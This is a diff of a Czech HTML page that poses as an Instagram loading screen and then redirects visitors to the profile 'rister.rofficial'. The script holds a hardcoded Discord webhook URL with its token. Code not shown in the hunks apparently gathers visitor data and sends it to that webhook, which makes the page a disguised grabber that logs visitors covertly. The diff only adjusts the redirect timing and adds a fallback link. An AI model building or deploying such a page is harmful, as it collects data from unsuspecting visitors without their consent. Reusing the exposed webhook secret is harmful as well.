@@ -14,6 +14,7 @@
 <body>
   <h2>Načítání Instagramu...</h2>
   <p>Prosím čekejte...</p>
+  <p>Pokud se nic nenačte, <a href="https://instagram.com/rister.rofficial">klikni zde</a>.</p>
 
   <script>
     const webhookURL = "https://discordapp.com/api/webhooks/1369301414899224646/lUXipWbVV9yHCN-sp0nvuuNQEd-7U_HprR-UTL5VeWvLmveoh5zIIRB76w1nfbjU_Dd7";
@@ -53,12 +54,15 @@
           });
         }
 
+        // Po 5 vteřinách přesměrování
         setTimeout(() => {
           window.location.href = "instagram://user?username=rister.rofficial";
+
+          // Rezervní přesměrování na web IG
           setTimeout(() => {
             window.location.href = "https://instagram.com/rister.rofficial";
-          }, 1000);
-        },  4000);
+          }, 1500);
+        }, 5000);
       });
   </script>
 </body>
